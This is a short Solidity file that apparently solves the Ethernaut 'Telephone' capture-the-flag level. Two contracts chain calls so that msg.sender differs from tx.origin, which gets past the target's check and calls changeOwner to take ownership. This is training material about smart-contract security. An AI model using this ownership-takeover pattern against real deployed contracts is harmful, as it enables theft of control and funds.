// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract BLocal {
    function call(address _telephone, address new_owner) public {
        Telephone telephone = Telephone(_telephone);
        telephone.changeOwner(new_owner);
    }
}

contract ALocal {
    function call(address _telephone, address new_owner) public {
        BLocal b = new BLocal();
        b.call(_telephone, new_owner);
    }
}
